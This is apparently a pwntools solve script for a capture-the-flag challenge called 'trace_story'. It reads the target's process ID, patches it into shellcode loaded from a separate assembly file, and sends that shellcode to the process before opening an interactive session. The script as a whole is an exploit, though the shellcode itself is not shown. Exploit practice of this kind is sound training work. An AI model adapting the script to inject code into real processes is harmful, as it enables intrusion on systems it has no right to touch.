from pwn import *

context.arch = "amd64"
#r = process(["strace", "./trace_story"])
#r = remote("0.cloud.chals.io", 15148)
r = process(["./trace_story"])
pid = r.recvuntil(b"Input").split(b"pid: ")[1].split(b"\n")[0]
#pid = r.recvuntil(b"Input").split(b"pid: ")[1].split(b"\\")[0]
#pid = b"123"
print("PID " + str(pid))

with open("tracestory.asm", "r") as f:
    sc = f.read().replace("PID", pid.decode())

sc = asm(sc)

with open("tracestory.bin", "wb") as f:
    f.write(sc)

r.sendline(sc)
r.interactive()
